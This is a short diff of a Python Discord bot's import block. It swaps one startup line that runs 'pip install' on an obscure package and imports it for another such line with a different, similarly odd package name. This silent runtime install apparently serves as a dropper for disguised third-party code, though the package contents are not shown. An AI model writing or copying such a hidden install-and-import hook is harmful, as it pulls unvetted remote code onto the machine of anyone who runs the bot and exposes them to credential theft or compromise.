@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install pythoncoloringsaddons")
-import pythoncoloringsaddons
+os.system("pip install pipfontingkitV1")
+import pipfontingkitV1
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
